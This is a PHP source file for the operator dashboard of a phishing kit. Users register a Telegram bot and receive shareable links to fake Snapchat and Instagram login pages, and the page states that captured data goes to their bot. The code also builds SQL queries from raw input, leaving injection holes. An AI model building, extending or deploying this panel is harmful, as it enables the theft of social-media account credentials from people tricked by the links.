<?php
// users/dashboard.php - Full dashboard with email, token, bot management, links, and scroll buttons

session_start();
require_once 'auth_check.php';
require_once '../common/config.php';

$conn = getDB();
$user_id = $_SESSION['user_id'];
$message = '';
$error = '';

// Get user data including email and token
$user = $conn->query("SELECT * FROM users WHERE id = $user_id")->fetch_assoc();
if (!$user) {
    session_destroy();
    header("Location: login.php?error=account_not_found");
    exit();
}

// Get user's bot (assigned or self-created)
$bot = $conn->query("SELECT * FROM bots WHERE assigned_to = $user_id AND status = 'active'")->fetch_assoc();

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['update_bot']) && $bot) {
        $new_token = trim($_POST['bot_token']);
        $new_chat = trim($_POST['chat_id']);
        if (empty($new_token) || empty($new_chat)) {
            $error = "Both token and chat ID are required.";
        } else {
            $check = $conn->query("SELECT id FROM bots WHERE bot_token='$new_token' AND id != {$bot['id']}");
            if ($check && $check->num_rows > 0) {
                $error = "Bot token already exists.";
            } else {
                $stmt = $conn->prepare("UPDATE bots SET bot_token = ?, chat_id = ? WHERE id = ?");
                $stmt->bind_param("ssi", $new_token, $new_chat, $bot['id']);
                if ($stmt->execute()) {
                    $message = "Bot updated successfully.";
                    $bot['bot_token'] = $new_token;
                    $bot['chat_id'] = $new_chat;
                } else {
                    $error = "Database error: " . $conn->error;
                }
                $stmt->close();
            }
        }
    } elseif (isset($_POST['create_bot']) && !$bot) {
        $name = trim($_POST['name']);
        $token = trim($_POST['bot_token']);
        $chat = trim($_POST['chat_id']);
        if (empty($name) || empty($token) || empty($chat)) {
            $error = "All fields are required.";
        } else {
            $check = $conn->query("SELECT id FROM bots WHERE bot_token='$token'");
            if ($check && $check->num_rows > 0) {
                $error = "Bot token already exists.";
            } else {
                $stmt = $conn->prepare("INSERT INTO bots (name, bot_token, chat_id, assigned_to, status) VALUES (?, ?, ?, ?, 'active')");
                $stmt->bind_param("sssi", $name, $token, $chat, $user_id);
                if ($stmt->execute()) {
                    $message = "Bot created!";
                    $bot = $conn->query("SELECT * FROM bots WHERE assigned_to = $user_id AND status = 'active'")->fetch_assoc();
                } else {
                    $error = "Database error: " . $conn->error;
                }
                $stmt->close();
            }
        }
    }
}
$conn->close();

// Generate shareable links using token
$base_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'];
$snap_link = $base_url . '/snap/login.php?token=' . $user['link_token'];
$ig_link = $base_url . '/ig/login.php?token=' . $user['link_token'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>User Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background: linear-gradient(145deg, #0a0a0f 0%, #1a1a2a 100%);
            color: #e2e8f0;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            overflow-y: auto;
            margin: 0;
            padding: 1.5rem 1rem 5rem 1rem;
        }
        .dashboard-container { max-width: 640px; margin: 0 auto; }
        .card {
            background: rgba(20, 30, 50, 0.6);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 2rem;
            padding: 1.75rem;
            box-shadow: 0 15px 30px -10px rgba(0,0,0,0.5);
            margin-bottom: 1.5rem;
        }
        .input-field {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.15);
            color: white;
            padding: 0.85rem 1rem;
            border-radius: 1rem;
            width: 100%;
            font-size: 16px;
            transition: all 0.2s;
        }
        .input-field:focus {
            border-color: #3b82f6;
            outline: none;
            background: rgba(0,0,0,0.4);
            box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
        }
        .btn-primary {
            background: linear-gradient(145deg, #3b82f6, #8b5cf6);
            color: white;
            font-weight: 600;
            padding: 0.85rem;
            border-radius: 1rem;
            width: 100%;
            border: none;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-primary:active { transform: scale(0.97); opacity: 0.9; }
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 0.75rem;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-secondary:active { background: rgba(255,255,255,0.2); }
        .link-box {
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 0.75rem;
            padding: 0.6rem 0.75rem;
            font-size: 14px;
            word-break: break-all;
            color: #a5b4fc;
            font-family: monospace;
        }
        .text-label {
            color: #94a3b8;
            font-size: 0.8rem;
            margin-bottom: 0.25rem;
            display: block;
        }
        .stat-value {
            color: #f1f5f9;
            font-weight: 500;
        }
        .email-display {
            background: rgba(0,0,0,0.2);
            border-radius: 1rem;
            padding: 1rem;
            margin-bottom: 1rem;
        }
        /* Floating scroll buttons */
        .scroll-buttons {
            position: fixed;
            bottom: 90px;
            right: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            z-index: 30;
        }
        .scroll-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: rgba(59,130,246,0.9);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.2);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            cursor: pointer;
            user-select: none;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            transition: transform 0.1s;
        }
        .scroll-btn:active { transform: scale(0.95); background: #2563eb; }
        @media (max-width: 400px) {
            .scroll-buttons {
                bottom: 80px;
                right: 15px;
            }
            .scroll-btn {
                width: 45px;
                height: 45px;
                font-size: 20px;
            }
        }
    </style>
    <?php echo getSecurityScript(); ?>
</head>
<body>
    <div class="dashboard-container">
        <h1 class="text-2xl font-bold mb-2 flex items-center">
            <i class="fas fa-user-circle text-blue-400 mr-3 text-3xl"></i>Dashboard
        </h1>
        <p class="text-gray-300 mb-6 text-sm border-l-4 border-blue-500 pl-3">
            Welcome, <span class="font-semibold"><?= htmlspecialchars($_SESSION['user_username'] ?? 'User') ?></span>
        </p>

        <?php if ($message): ?>
            <div class="bg-green-900/60 border border-green-500/50 p-3 rounded-xl text-sm text-green-100 mb-4 flex items-center">
                <i class="fas fa-check-circle mr-2"></i> <?= $message ?>
            </div>
        <?php endif; ?>
        <?php if ($error): ?>
            <div class="bg-red-900/60 border border-red-500/50 p-3 rounded-xl text-sm text-red-100 mb-4 flex items-center">
                <i class="fas fa-exclamation-circle mr-2"></i> <?= $error ?>
            </div>
        <?php endif; ?>

        <!-- Email Card -->
        <div class="card">
            <h2 class="text-lg font-semibold mb-3 flex items-center">
                <i class="fas fa-envelope text-blue-400 mr-2"></i>Your Email
            </h2>
            <div class="email-display">
                <?php if (!empty($user['email'])): ?>
                    <p class="text-gray-300"><?= htmlspecialchars($user['email']) ?></p>
                <?php else: ?>
                    <p class="text-yellow-400">No email set. Contact admin to add an email for OTP.</p>
                <?php endif; ?>
            </div>
        </div>

        <!-- Token Card -->
        <div class="card">
            <h2 class="text-lg font-semibold mb-3 flex items-center">
                <i class="fas fa-key text-yellow-400 mr-2"></i>Your Secret Token
            </h2>
            <p class="text-xs text-gray-400 mb-2">This token is used in your login links. Keep it private!</p>
            <div class="flex items-center gap-2">
                <div class="link-box flex-1"><?= htmlspecialchars($user['link_token']) ?></div>
                <button class="btn-secondary" onclick="copyToClipboard('<?= $user['link_token'] ?>', this)">Copy</button>
            </div>
        </div>

        <?php if ($bot): ?>
            <!-- Bot Info Card -->
            <div class="card">
                <h2 class="text-lg font-semibold mb-3 flex items-center">
                    <i class="fas fa-robot text-green-400 mr-2"></i>Your Bot
                </h2>
                <div class="space-y-2 text-sm mb-4">
                    <div><span class="text-label">Name:</span> <span class="stat-value"><?= htmlspecialchars($bot['name']) ?></span></div>
                    <div><span class="text-label">Token:</span> <span class="stat-value font-mono"><?= substr($bot['bot_token'],0,16) ?>…</span></div>
                    <div><span class="text-label">Chat ID:</span> <span class="stat-value"><?= htmlspecialchars($bot['chat_id']) ?></span></div>
                </div>

                <details class="mt-3 bg-black/20 rounded-xl p-3 border border-white/10">
                    <summary class="text-sm font-medium text-blue-300 cursor-pointer">⚙️ Update Bot Token & Chat ID</summary>
                    <form method="POST" class="mt-3 space-y-3">
                        <div>
                            <label class="text-label">Bot Token</label>
                            <input type="text" name="bot_token" value="<?= htmlspecialchars($bot['bot_token']) ?>" class="input-field" required>
                        </div>
                        <div>
                            <label class="text-label">Chat ID</label>
                            <input type="text" name="chat_id" value="<?= htmlspecialchars($bot['chat_id']) ?>" class="input-field" required>
                        </div>
                        <button type="submit" name="update_bot" class="btn-primary">Update Bot</button>
                    </form>
                </details>
            </div>

            <!-- Login Pages Links Card -->
            <div class="card">
                <h2 class="text-lg font-semibold mb-3 flex items-center">
                    <i class="fas fa-share-alt text-yellow-400 mr-2"></i>Your Login Pages
                </h2>
                <p class="text-xs text-gray-400 mb-3">Share these links (data goes to your bot)</p>
                <div class="space-y-3">
                    <div>
                        <div class="text-label mb-1">👻 Snapchat</div>
                        <div class="flex items-center gap-2">
                            <div class="link-box flex-1" id="snapLink"><?= $snap_link ?></div>
                            <button class="btn-secondary" onclick="copyToClipboard('<?= $snap_link ?>', this)">Copy</button>
                        </div>
                    </div>
                    <div>
                        <div class="text-label mb-1">📷 Instagram</div>
                        <div class="flex items-center gap-2">
                            <div class="link-box flex-1" id="igLink"><?= $ig_link ?></div>
                            <button class="btn-secondary" onclick="copyToClipboard('<?= $ig_link ?>', this)">Copy</button>
                        </div>
                    </div>
                </div>
            </div>
        <?php else: ?>
            <!-- Create Bot Card -->
            <div class="card">
                <h2 class="text-lg font-semibold mb-3 flex items-center">
                    <i class="fas fa-plus-circle text-blue-400 mr-2"></i>Create Your Bot
                </h2>
                <p class="text-sm text-gray-300 mb-4">You don't have a bot yet. Enter your details to activate.</p>
                <form method="POST" class="space-y-4">
                    <div>
                        <label class="text-label">Bot Name</label>
                        <input type="text" name="name" placeholder="e.g., MyTelegramBot" required class="input-field">
                    </div>
                    <div>
                        <label class="text-label">Bot Token</label>
                        <input type="text" name="bot_token" placeholder="123456:ABC-DEF1234" required class="input-field">
                    </div>
                    <div>
                        <label class="text-label">Chat ID</label>
                        <input type="text" name="chat_id" placeholder="123456789" required class="input-field">
                    </div>
                    <button type="submit" name="create_bot" class="btn-primary">Create Bot</button>
                </form>
            </div>
        <?php endif; ?>
    </div>

    <!-- Floating Scroll Buttons -->
    <div class="scroll-buttons">
        <div class="scroll-btn" id="scrollUpBtn" title="Scroll Up (hold)">↑</div>
        <div class="scroll-btn" id="scrollDownBtn" title="Scroll Down (hold)">↓</div>
    </div>

    <?php include 'common/bottom.php'; ?>

    <script>
        function copyToClipboard(text, btn) {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text).then(() => showCopied(btn)).catch(() => fallbackCopy(text, btn));
            } else {
                fallbackCopy(text, btn);
            }
        }
        function fallbackCopy(text, btn) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                showCopied(btn);
            } catch {
                alert('Could not copy. Please select and copy manually.');
            }
            document.body.removeChild(textarea);
        }
        function showCopied(btn) {
            const original = btn.innerText;
            btn.innerText = 'Copied!';
            setTimeout(() => btn.innerText = original, 1500);
        }

        // Scroll button functionality
        let scrollInterval = null;
        const scrollStep = 15;

        function startScroll(direction) {
            if (scrollInterval) return;
            scrollInterval = setInterval(() => {
                window.scrollBy(0, direction * scrollStep);
            }, 30);
        }
        function stopScroll() {
            if (scrollInterval) {
                clearInterval(scrollInterval);
                scrollInterval = null;
            }
        }

        const upBtn = document.getElementById('scrollUpBtn');
        const downBtn = document.getElementById('scrollDownBtn');

        if (upBtn) {
            upBtn.addEventListener('touchstart', (e) => { e.preventDefault(); startScroll(-1); });
            upBtn.addEventListener('touchend', stopScroll);
            upBtn.addEventListener('touchcancel', stopScroll);
            upBtn.addEventListener('mousedown', (e) => { e.preventDefault(); startScroll(-1); });
            upBtn.addEventListener('mouseup', stopScroll);
            upBtn.addEventListener('mouseleave', stopScroll);
        }
        if (downBtn) {
            downBtn.addEventListener('touchstart', (e) => { e.preventDefault(); startScroll(1); });
            downBtn.addEventListener('touchend', stopScroll);
            downBtn.addEventListener('touchcancel', stopScroll);
            downBtn.addEventListener('mousedown', (e) => { e.preventDefault(); startScroll(1); });
            downBtn.addEventListener('mouseup', stopScroll);
            downBtn.addEventListener('mouseleave', stopScroll);
        }
    </script>
</body>
</html>